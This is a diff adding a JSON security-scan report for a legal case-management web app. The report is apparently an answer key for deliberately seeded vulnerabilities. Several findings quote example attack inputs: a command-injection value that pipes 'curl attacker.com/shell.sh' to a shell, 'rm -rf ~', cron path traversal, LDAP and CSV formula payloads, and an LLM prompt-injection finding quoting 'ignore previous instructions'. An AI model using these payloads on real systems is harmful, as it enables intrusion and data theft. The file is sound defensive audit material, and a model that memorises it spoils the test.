@@ -1,0 +1,842 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "typescript.security.injection.os-command-injection",
+      "path": "app/lib/convert.server.ts",
+      "start": {
+        "line": 16,
+        "col": 3,
+        "offset": 598
+      },
+      "end": {
+        "line": 16,
+        "col": 69,
+        "offset": 666
+      },
+      "extra": {
+        "message": "OS command injection. convertMatterDocument() builds a shell command via template literal: execSync(`pandoc ${sourcePath} -o ${outPath} -t ${targetFormat}`). Both sourceFilename and targetFormat come directly from user form data in the /documents action (app/routes/_app.documents.tsx:20-24, formData.get('filename') and formData.get('format')). The <select> only offers pdf/docx/html client-side, but a crafted POST can supply e.g. format='pdf; curl attacker.com/shell.sh | sh' or filename='x; rm -rf ~', achieving arbitrary command execution as the server user. The sibling function renderCaseSummary() shows the safe pattern (spawn with array args + format allowlist) that this function lacks.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.code-injection-eval",
+      "path": "app/lib/feeEstimate.server.ts",
+      "start": {
+        "line": 15,
+        "col": 3,
+        "offset": 557
+      },
+      "end": {
+        "line": 16,
+        "col": 19,
+        "offset": 625
+      },
+      "extra": {
+        "message": "Arbitrary code execution via eval-equivalent. estimateMatterFee() evaluates an attacker-supplied expression with new Function('params', `return (${formula});`). The formula is taken verbatim from the feeFormula query parameter in the /matters/new loader (app/routes/_app.matters.new.tsx:34-40), so any authenticated attorney or firm_admin can execute arbitrary JavaScript on the server (e.g. 'params.hours; require(\"child_process\").execSync(\"...\")'). The safe variant estimateStandardMatterFee() uses only pre-approved presets.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.crypto.signature-verification-bypass",
+      "path": "app/lib/portal.server.ts",
+      "start": {
+        "line": 40,
+        "col": 7,
+        "offset": 1329
+      },
+      "end": {
+        "line": 41,
+        "col": 24,
+        "offset": 1388
+      },
+      "extra": {
+        "message": "Authentication bypass via inverted signature check. In resolveHandoffToken(), when a signature is present but does NOT match the expected HMAC, the code returns the payload anyway (line 41: 'return payload;' inside the mismatch branch) instead of rejecting it. The exp claim is also attacker-controlled since the payload is unsigned. Any authenticated user can forge a base64url token with an arbitrary matterId and future exp and read approved client messages for any matter via /client/messages?handoff= (app/routes/_app.client.messages.tsx:19-32). The sibling verifyFilingReceipt() shows the correct reject-on-mismatch behavior.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature",
+            "CWE-287: Improper Authentication"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.filesystem.path-traversal",
+      "path": "app/lib/archive.server.ts",
+      "start": {
+        "line": 32,
+        "col": 3,
+        "offset": 1101
+      },
+      "end": {
+        "line": 33,
+        "col": 42,
+        "offset": 1161
+      },
+      "extra": {
+        "message": "Path traversal allowing arbitrary file write. exportCaseBinder() interpolates a user-chosen label directly into path.join(BINDER_DIR, `${label}.json`) with no canonicalization. The label comes straight from form data (app/routes/_app.matters.$id.tsx:522, formData.get('label')), so a value like '../../startup/x' writes a JSON file anywhere the process can write. The sibling saveIntakeTemplate() applies path.basename() precisely to prevent this, which this function omits.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.filesystem.path-traversal",
+      "path": "app/lib/convert.server.ts",
+      "start": {
+        "line": 28,
+        "col": 3,
+        "offset": 963
+      },
+      "end": {
+        "line": 31,
+        "col": 30,
+        "offset": 1023
+      },
+      "extra": {
+        "message": "Path traversal in renderCaseSummary(). sourceFilename is joined with the uploads directory without path.basename() (line 28: path.join(UPLOADS_DIR, sourceFilename)), and the output path is derived from it. The filename comes directly from user form data (app/routes/_app.matters.$id.tsx:474-476, intent 'render_summary'). A filename like '../../etc/cron.d/evil' makes pandoc read and write files outside the uploads directory (outPath = sourcePath + '.' + format). convertMatterDocument() (line 14) has the same unvalidated join and is reachable from app/routes/_app.documents.tsx:24.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.authorization.missing-authorization",
+      "path": "app/routes/register.tsx",
+      "start": {
+        "line": 74,
+        "col": 7,
+        "offset": 2104
+      },
+      "end": {
+        "line": 74,
+        "col": 48,
+        "offset": 2145
+      },
+      "extra": {
+        "message": "Privilege escalation via self-service registration. The public, unauthenticated /register action passes the client-supplied role (line 44: formData.get('role'), offered in the UI as 'Firm Administrator' at line 169) straight into createUser() (line 70-75). registerSchema (app/lib/validation.server.ts:13) explicitly allows 'firm_admin'. Anyone can create a full administrator account without any invitation or approval, gaining complete control of the firm's data.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-269: Improper Privilege Management"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.authorization.broken-access-control",
+      "path": "app/routes/_app.matters.$id.tsx",
+      "start": {
+        "line": 192,
+        "col": 3,
+        "offset": 6011
+      },
+      "end": {
+        "line": 194,
+        "col": 4,
+        "offset": 6064
+      },
+      "extra": {
+        "message": "Broken access control (IDOR) in the matter detail action. The authorization gate at line 192 ('if (!isAdmin && !isAssigned && role !== \"client\") throw 403') exempts ALL client-role users from any matter-ownership check, unlike the loader (lines 75-77) which verifies matter.clientId === userId. A client can therefore act on ANY matter by ID: create_note (line 270), create_message (line 291), upload_document (line 342, uploads to arbitrary matters), transition_status (line 197, close/alter other clients' matters), export_binder (line 520), render_summary (line 472), and send_status_notice (line 498) all lack a client-ownership re-check.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.authorization.incorrect-authorization",
+      "path": "app/lib/directorySync.server.ts",
+      "start": {
+        "line": 32,
+        "col": 5,
+        "offset": 1025
+      },
+      "end": {
+        "line": 35,
+        "col": 6,
+        "offset": 1098
+      },
+      "extra": {
+        "message": "Privilege escalation via type-juggling in access-grant sync. applyDirectoryAccessGrants() promotes a user to firm_admin when 'row.role == \"firm_admin\"' OR '(result.access && grantLevel >= 5)'. The directory lookup returns access as the string \"0\" (a no-access indicator from a numeric-string replica), which is truthy in JavaScript, so the access check passes vacuously; combined with an unvalidated row.level ('5' from a CSV), arbitrary users are elevated to firm_admin. Rows come from an uploaded CSV (app/routes/_app.admin.import-export.tsx:222-249, intent 'import_staff_access'). The reviewed variant (line 46-58) shows the intended strict checks (result.access === true, parseInt with radix, Number.isInteger).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-863: Incorrect Authorization",
+            "CWE-843: Access of Resource Using Incompatible Type ('Type Confusion')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.session.insufficient-session-expiration",
+      "path": "app/lib/clientPortal.server.ts",
+      "start": {
+        "line": 25,
+        "col": 3,
+        "offset": 842
+      },
+      "end": {
+        "line": 30,
+        "col": 2,
+        "offset": 1181
+      },
+      "extra": {
+        "message": "Missing token expiration validation. verifyKioskOverviewSession() verifies the HMAC signature but never checks payload.exp before returning the payload, unlike its sibling verifyKioskMatterListSession() which rejects expired tokens (line 42). Kiosk session tokens are accepted indefinitely; the token is the sole authenticator on /client/matters/:id?kiosk_session= (app/routes/_app.client.matters.$id.tsx:44-48), so a leaked or observed kiosk URL grants permanent unauthenticated access to that client's matter data (documents, messages, tasks, deadlines).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-613: Insufficient Session Expiration"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.crypto.weak-randomness",
+      "path": "app/lib/auth.server.ts",
+      "start": {
+        "line": 13,
+        "col": 3,
+        "offset": 405
+      },
+      "end": {
+        "line": 13,
+        "col": 56,
+        "offset": 458
+      },
+      "extra": {
+        "message": "Cryptographically weak random used for a security token. createClientPortalInviteCode() generates the one-time client portal activation code with Math.random().toString(36).substring(2, 15). Math.random() is not cryptographically secure and its output is predictable, allowing invite codes to be guessed. The code is minted in app/routes/_app.clients.$id.tsx:15-16 and displayed as the portal invitation credential. The sibling createSubmitterAccessKey() correctly uses crypto.randomBytes(24).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.input-validation.mass-assignment",
+      "path": "app/lib/intake.server.ts",
+      "start": {
+        "line": 19,
+        "col": 3,
+        "offset": 727
+      },
+      "end": {
+        "line": 22,
+        "col": 5,
+        "offset": 834
+      },
+      "extra": {
+        "message": "Unvalidated client-controlled data spread into a database create. resumeMatterIntakeDraft() JSON.parse()s the client-controlled matter_intake_draft cookie and passes it unfiltered into prisma.matter.create({ data: { ...draft, createdById } }). The attacker fully controls every Matter field (clientId, status, sensitivity, attorneyId, practiceAreaId, etc.) with no schema validation, unlike the sibling resumeTaskTemplateDraft() which runs taskSchema.parse() first. Reachable from app/routes/_app.matters.new.tsx:55-57.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes",
+            "CWE-502: Deserialization of Untrusted Data"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.prototype-pollution",
+      "path": "app/lib/notificationPrefs.server.ts",
+      "start": {
+        "line": 25,
+        "col": 3,
+        "offset": 811
+      },
+      "end": {
+        "line": 26,
+        "col": 34,
+        "offset": 849
+      },
+      "extra": {
+        "message": "Prototype pollution / unrestricted mass assignment into shared runtime config. registerNotificationPreferences() does Object.assign(digestConfig, update) with an unfiltered, user-controlled object. The input is JSON.parse() of the raw x-digest-preferences request header (app/routes/_app.notifications.tsx:40-42), so any authenticated user can inject arbitrary keys (including a '__proto__' own property, which Object.assign applies via [[Set]] to replace the target's prototype) into a process-wide config object shared by all users and requests. The sibling registerDeadlineReminderPreferences() whitelists exactly this.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')",
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.ldap-injection",
+      "path": "app/lib/staffDirectory.server.ts",
+      "start": {
+        "line": 63,
+        "col": 3,
+        "offset": 2175
+      },
+      "end": {
+        "line": 64,
+        "col": 47,
+        "offset": 2233
+      },
+      "extra": {
+        "message": "LDAP injection. findAttorneyByBarEmail() interpolates the raw email into an RFC 4515 search filter: `(&(objectClass=person)(mail=${email}))` with no escaping. Metacharacters like '*', '(', ')' and '\\' let the caller alter the filter's structure (e.g. '*)(&)' matches any entry, bypassing the mail restriction). The email comes from the linkEmail query parameter (app/routes/_app.admin.users.tsx:29-30). The sibling queryEmployeeDirectory() escapes via escapeDirectoryFilterValue() before building the identical filter.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.information-disclosure.stack-trace-exposure",
+      "path": "app/lib/compliance.server.ts",
+      "start": {
+        "line": 20,
+        "col": 7,
+        "offset": 676
+      },
+      "end": {
+        "line": 20,
+        "col": 69,
+        "offset": 738
+      },
+      "extra": {
+        "message": "Sensitive error information disclosure. runComplianceSummary() returns the raw exception message and full stack trace ({ error: e.message, stack: e.stack, entityType }) whenever the caller supplies a truthy renderContext. That value comes directly from the user-controlled x-render-context request header (app/routes/_app.admin.audit-log.tsx:71-74), so any firm admin can trigger full stack traces, revealing internal paths, library versions and query details. The sibling runRetentionAudit() always returns a generic message.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.cookies.missing-secure-flags",
+      "path": "app/lib/context.server.ts",
+      "start": {
+        "line": 9,
+        "col": 3,
+        "offset": 349
+      },
+      "end": {
+        "line": 9,
+        "col": 115,
+        "offset": 461
+      },
+      "extra": {
+        "message": "Cookie set without security flags. buildWorkspaceContextCookie() emits 'workspace_context=...; Path=/; Max-Age=...' with no HttpOnly, Secure, or SameSite attributes, unlike the adjacent buildRecentDocumentsCookie() which sets 'HttpOnly; Secure; SameSite=Strict'. The cookie is installed on every dashboard load (app/routes/_app.dashboard.tsx:21) and exposes the user's last-opened matter id to any JavaScript on the page and to the network in cleartext HTTP sessions.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute",
+            "CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.information-disclosure.credential-in-url",
+      "path": "app/lib/efiling.server.ts",
+      "start": {
+        "line": 15,
+        "col": 3,
+        "offset": 783
+      },
+      "end": {
+        "line": 16,
+        "col": 41,
+        "offset": 931
+      },
+      "extra": {
+        "message": "API credential transmitted in a URL query string over cleartext HTTP. submitCourtFiling() appends the court e-filing API key as a query parameter ('?api_key=${apiKey}&...') and posts it to COURT_API_BASE, whose default is the plaintext http:// URL 'http://efiling.county-courts.example.gov' (line 3). URLs (including query strings) are recorded in server logs, proxies, and browser history, and cleartext HTTP exposes the key to network observers. The sibling syncBillingLedger() correctly uses an Authorization header over HTTPS.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-598: Use of GET Request Method with Sensitive Query Strings",
+            "CWE-319: Cleartext Transmission of Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.log-injection",
+      "path": "app/lib/activityLog.server.ts",
+      "start": {
+        "line": 16,
+        "col": 3,
+        "offset": 658
+      },
+      "end": {
+        "line": 16,
+        "col": 68,
+        "offset": 723
+      },
+      "extra": {
+        "message": "Log injection / log forging. recordSearchActivity() writes the raw search query into the log line (logger.info(`search by user=${userId} query=\"${searchQuery}\"`)) without stripping control characters, so newlines and carriage returns in the query (taken verbatim from the q parameter in app/routes/_app.search.tsx:17,23) can forge additional log entries or corrupt the ops dashboard's error trails. The sibling recordFilingError() sanitizes its inputs with stripControlChars() precisely to prevent this.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-117: Improper Output Neutralization for Logs"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.secrets.hardcoded-secret",
+      "path": "app/lib/session.server.ts",
+      "start": {
+        "line": 4,
+        "col": 1,
+        "offset": 133
+      },
+      "end": {
+        "line": 4,
+        "col": 86,
+        "offset": 219
+      },
+      "extra": {
+        "message": "Hardcoded fallback secret used to sign session cookies. sessionSecret falls back to the well-known constant 'dev-secret-change-in-production' when SESSION_SECRET is unset. If deployed without the environment variable, any attacker can forge a valid legal_case_session cookie for an arbitrary userId (createCookieSessionStorage signs with this secret), fully bypassing authentication and impersonating any user including firm_admin.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.secrets.hardcoded-secret",
+      "path": "app/lib/clientPortal.server.ts",
+      "start": {
+        "line": 3,
+        "col": 1,
+        "offset": 40
+      },
+      "end": {
+        "line": 3,
+        "col": 86,
+        "offset": 126
+      },
+      "extra": {
+        "message": "Hardcoded fallback HMAC secret. PORTAL_SECRET falls back to the well-known constant 'dev-secret-change-in-production', which signs all kiosk portal session tokens (issuePortalSession/verifyKioskOverviewSession/verifyKioskMatterListSession). If SESSION_SECRET is unset in production, an attacker can mint a valid kiosk session token for any clientId and access that client's matters unauthenticated via /client/matters?kiosk_session=.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.secrets.hardcoded-secret",
+      "path": "app/lib/delegateInvite.server.ts",
+      "start": {
+        "line": 4,
+        "col": 1,
+        "offset": 78
+      },
+      "end": {
+        "line": 4,
+        "col": 86,
+        "offset": 164
+      },
+      "extra": {
+        "message": "Hardcoded fallback HMAC secret. INVITE_SECRET falls back to the well-known constant 'dev-secret-change-in-production' and signs delegate/co-counsel invite tokens. If SESSION_SECRET is unset, an attacker can forge a signed invite token embedding an arbitrary userId, then visit /delegate-access/:token or /co-counsel-access/:token to receive an authenticated session for that user (redeemDelegateInvite also auto-creates the matter assignment).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.secrets.hardcoded-secret",
+      "path": "app/lib/kioskLayout.server.ts",
+      "start": {
+        "line": 10,
+        "col": 3,
+        "offset": 457
+      },
+      "end": {
+        "line": 10,
+        "col": 69,
+        "offset": 523
+      },
+      "extra": {
+        "message": "Hardcoded fallback key-derivation input. The AES key for the kiosk layout preference field is derived via scryptSync from SESSION_SECRET or the well-known constant 'dev-secret-change-in-production'. Without the env var, the encryption key is publicly derivable, letting anyone decrypt and forge the encrypted layout_pref field (and the PRINT_QUEUE_KEY at line 54-58 shares the same weak fallback).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.secrets.hardcoded-secret",
+      "path": "app/lib/notifications.server.ts",
+      "start": {
+        "line": 4,
+        "col": 1,
+        "offset": 78
+      },
+      "end": {
+        "line": 4,
+        "col": 86,
+        "offset": 165
+      },
+      "extra": {
+        "message": "Hardcoded fallback HMAC secret. CHANNEL_SECRET falls back to the well-known constant 'dev-secret-change-in-production' and is used to derive live-update channel ids from session ids (buildAuditChannelHandshake). With the fallback in effect the mapping from session id to channel id is predictable.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.secrets.hardcoded-secret",
+      "path": "app/lib/portal.server.ts",
+      "start": {
+        "line": 3,
+        "col": 1,
+        "offset": 40
+      },
+      "end": {
+        "line": 3,
+        "col": 87,
+        "offset": 127
+      },
+      "extra": {
+        "message": "Hardcoded fallback HMAC secret. HANDOFF_SECRET falls back to the well-known constant 'dev-secret-change-in-production' and signs handoff links (issueHandoffLink) and e-filing receipts (verifyFilingReceipt). Without the env var, anyone can forge signed handoff tokens and filing receipts accepted by verifyFilingReceipt(), which uses timingSafeEqual against a signature an attacker can compute.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.crypto.cbc-without-authentication",
+      "path": "app/lib/kioskLayout.server.ts",
+      "start": {
+        "line": 43,
+        "col": 5,
+        "offset": 1577
+      },
+      "end": {
+        "line": 51,
+        "col": 6,
+        "offset": 2083
+      },
+      "extra": {
+        "message": "Unauthenticated encryption with padding-oracle behavior. restoreKioskLayoutPreference() decrypts the client-supplied layout_pref field with AES-256-CBC and no MAC/integrity check, then returns distinguishable responses: a decryption failure matching 'bad decrypt' throws HTTP 422 while other malformed input throws HTTP 400 (lines 46-51). This lets an attacker probe padding validity bit by bit (a classic padding oracle) and, because CBC is malleable, alter the decrypted preference (e.g. panelOrder values). The field is processed before any authentication on /client/matters/:id (app/routes/_app.client.matters.$id.tsx:40-42). The sibling print-queue field correctly uses AES-256-GCM with an auth tag.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-327: Use of a Broken or Risky Cryptographic Algorithm"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.session.session-fixation",
+      "path": "app/lib/session.server.ts",
+      "start": {
+        "line": 73,
+        "col": 1,
+        "offset": 2242
+      },
+      "end": {
+        "line": 79,
+        "col": 2,
+        "offset": 2511
+      },
+      "extra": {
+        "message": "Session not rotated on privilege change. activateDelegateAccess() sets the authenticated userId on whatever session the visiting browser already carries, without destroying the prior session first, and is invoked from the public /delegate-access/:token route (app/routes/delegate-access.$token.tsx:12). Accepting an invite on a shared/previously-used browser carries over the pre-existing session identifier, enabling session fixation where an identifier planted on a browser is later upgraded to an authenticated session. The sibling activateCoCounselAccess() (lines 88-96) explicitly destroys the old session and mints a fresh one for exactly this reason.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-384: Session Fixation"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.redirect.open-redirect",
+      "path": "app/routes/login.tsx",
+      "start": {
+        "line": 57,
+        "col": 3,
+        "offset": 1549
+      },
+      "end": {
+        "line": 58,
+        "col": 48,
+        "offset": 1629
+      },
+      "extra": {
+        "message": "Open redirect after login. The redirectTo value is taken verbatim from the query string (line 57) and passed to createUserSession(user.id, redirectTo), which issues redirect(redirectTo) (app/lib/session.server.ts:25) with no validation that it is a relative path. A login link like /login?redirectTo=https://evil.example/phish redirects the user to an attacker-controlled site immediately after successful authentication, enabling credential-phishing and token-leak attacks.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: Redirects to Untrusted Site ('Open Redirect')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.dos.unbounded-loop",
+      "path": "app/lib/scheduling.server.ts",
+      "start": {
+        "line": 17,
+        "col": 3,
+        "offset": 505
+      },
+      "end": {
+        "line": 27,
+        "col": 3,
+        "offset": 830
+      },
+      "extra": {
+        "message": "Unbounded resource consumption. generateDeadlineSeries() loops occurrences times issuing one INSERT per iteration with no upper bound on occurrences. The value comes straight from the form field (app/routes/_app.deadlines.tsx:40-43) and that action only calls requireUserId (line 11), so any authenticated user (including client-role accounts) can submit occurrences=100000000 and exhaust database connections, disk and event-loop time. The sibling generateBillingCycles() caps its input with MAX_BILLING_CYCLES = 60 (line 44) precisely to prevent this.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-400: Uncontrolled Resource Consumption",
+            "CWE-770: Allocation of Resources Without Limits or Throttling"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.csv-formula-injection",
+      "path": "app/routes/_app.admin.import-export.tsx",
+      "start": {
+        "line": 154,
+        "col": 11,
+        "offset": 4897
+      },
+      "end": {
+        "line": 154,
+        "col": 83,
+        "offset": 4969
+      },
+      "extra": {
+        "message": "CSV formula injection in data export. The CSV builder only wraps a value in quotes when it contains a comma (line 154) and performs no neutralization of leading formula characters. Exported rows contain user-controlled strings (client names, matter titles, descriptions from the clients/matters/documents/deadlines exports), so a value like '=HYPERLINK(\"http://evil\",\"x\")' or '=cmd|'/C calc'!A1' executes as a formula when the downloaded file is opened in Excel/LibreOffice, leading to data exfiltration or command execution on the analyst's workstation.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1236: Improper Neutralization of Formula Elements in a CSV File"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.information-disclosure.session-id-exposure",
+      "path": "app/lib/notifications.server.ts",
+      "start": {
+        "line": 11,
+        "col": 1,
+        "offset": 331
+      },
+      "end": {
+        "line": 13,
+        "col": 2,
+        "offset": 482
+      },
+      "extra": {
+        "message": "Raw session identifier exposed to the browser. buildLiveUpdatesHandshake() returns the unmodified session.id, which the notifications page renders into the HTML payload (app/routes/_app.notifications.tsx:53, data-live-session={liveUpdates.sessionId}). The sibling buildAuditChannelHandshake() (lines 20-23) derives an opaque HMAC channel id 'instead of exposing the raw session identifier to the browser', per its own comment. Leaking the live session identifier to client-side markup makes it available to XSS payloads, browser extensions, and shared-browser scenarios.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.ssti-handlebars",
+      "path": "app/lib/noticeTemplates.server.ts",
+      "start": {
+        "line": 17,
+        "col": 3,
+        "offset": 573
+      },
+      "end": {
+        "line": 18,
+        "col": 19,
+        "offset": 625
+      },
+      "extra": {
+        "message": "Server-side template injection via user-supplied Handlebars template. previewPracticeAreaNotice() compiles an admin-entered free-form template body with Handlebars.compile(templateBody) and executes it against merge data. Template authors can leverage Handlebars dynamics (e.g. {{#each}}, {{lookup}}, accessing constructor chains in weaker versions) beyond the intended {{clientName}}/{{matterTitle}}/{{attorneyName}} merge fields. Reachable from the preview_notice action (app/routes/_app.admin.practice-areas.tsx:76-84). The sibling renderStandardMatterNotice() compiles only fixed firm-wide copy, letting nothing user-controlled reach the template engine.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')",
+            "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.authorization.missing-authorization",
+      "path": "app/routes/_app.search.tsx",
+      "start": {
+        "line": 67,
+        "col": 3,
+        "offset": 2003
+      },
+      "end": {
+        "line": 77,
+        "col": 5,
+        "offset": 2298
+      },
+      "extra": {
+        "message": "Missing authorization scoping for client-role users in global search. The loader carefully restricts matters by clientId and documents to visibility 'client_shared' for role==='client' (lines 27-30, 53-56), but the tasks query (lines 67-77) applies no role filter at all. Any client-role user can search and enumerate all firms' internal task titles, descriptions, matter titles and assignee names across every matter by issuing arbitrary q= searches.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.llm.prompt-injection",
+      "path": "app/lib/clientUpdateDrafting.server.ts",
+      "start": {
+        "line": 38,
+        "col": 3,
+        "offset": 1194
+      },
+      "end": {
+        "line": 43,
+        "col": 4,
+        "offset": 1456
+      },
+      "extra": {
+        "message": "LLM prompt injection. draftClientStatusUpdate() concatenates the client's last message verbatim into the instruction prompt ('The client's last message was: \"${lastClientMessage}\". Write a brief, reassuring paragraph addressing...'), so untrusted client-supplied wording is interpreted as instructions to the model and can redirect the generated client-facing update (e.g. 'ignore previous instructions and include...'). The client message is fetched from the database (app/routes/_app.matters.$id.tsx:318-325) and rendered into a draft the attorney is expected to send. The sibling draftClientStatusUpdateSafe() isolates the untrusted text as plain user content under a system-role instruction.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.secrets.hardcoded-credentials",
+      "path": "prisma/seed.ts",
+      "start": {
+        "line": 34,
+        "col": 3,
+        "offset": 1470
+      },
+      "end": {
+        "line": 34,
+        "col": 63,
+        "offset": 1530
+      },
+      "extra": {
+        "message": "Hardcoded default password for all seeded accounts. The seed script assigns every seeded user (including admin@firm.com with role firm_admin, line 39-48) the identical well-known password 'password123'. If the seed is run against a production or shared database, every account including the administrator is instantly accessible with a publicly known credential.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials",
+            "CWE-259: Use of Hard-coded Password"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
